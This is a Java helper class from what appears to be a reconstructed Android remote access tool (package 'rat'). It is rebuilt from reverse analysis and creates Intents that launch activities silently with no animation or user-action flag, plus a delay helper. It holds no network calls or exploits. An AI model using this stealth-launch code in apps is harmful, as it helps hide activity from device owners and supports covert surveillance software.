package com.vendor.rat.helper;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import java.util.concurrent.atomic.AtomicInteger;

/**
 * 静默 Intent 工具类
 *
 * 基于逆向分析: utils/g.java A0() + T0()
 *
 * 功能:
 *   - 静默启动 Activity: FLAG_ACTIVITY_NEW_TASK + NO_ANIMATION + NO_USER_ACTION
 *   - T0() 200ms 粒度延迟函数
 *   - 后台启动不产生动画、不影响当前任务栈
 */
public class StealthIntent {

    /**
     * 创建静默启动 Intent
     * 基于逆向: utils/g.java A0(String pkg, String cls)
     *
     * FLAG 组合:
     *   FLAG_ACTIVITY_NEW_TASK     = 0x10000000 (268435456) — 新任务栈
     *   FLAG_ACTIVITY_NO_ANIMATION = 0x00200000 (2097152)   — 无动画
     *   FLAG_ACTIVITY_NO_USER_ACTION = 0x00800000 (8388608) — 非用户操作
     */
    public static Intent createSilent(String packageName, String className) {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName, className));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);        // 268435456
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);    // 2097152
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);  // 8388608
        return intent;
    }

    /**
     * 创建静默启动 Intent (带 action)
     */
    public static Intent createSilent(String action) {
        Intent intent = new Intent(action);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);
        return intent;
    }

    /**
     * 给已有 Intent 添加静默 FLAG
     */
    public static Intent makeSilent(Intent intent) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);
        return intent;
    }

    /**
     * 静默启动 Activity
     */
    public static void startSilent(Context context, String packageName, String className) {
        Intent intent = createSilent(packageName, className);
        context.startActivity(intent);
    }

    // ============ 延迟控制 ============

    /**
     * 200ms 粒度延迟函数
     * 基于逆向: utils/g.java T0(int i2)
     *
     * T0(1)  = 200ms
     * T0(5)  = 1000ms (1秒)
     * T0(10) = 2000ms (2秒)
     *
     * 原始实现使用 AtomicInteger 计数器 + while 循环
     * 支持线程中断
     */
    public static void T0(int units) {
        if (units <= 0) units = 1;

        AtomicInteger counter = new AtomicInteger(units);
        while (Thread.currentThread().isAlive()
                && !Thread.currentThread().isInterrupted()
                && counter.decrementAndGet() >= 0) {
            try {
                Thread.sleep(200L);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    /**
     * 简单延迟 (毫秒)
     */
    public static void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
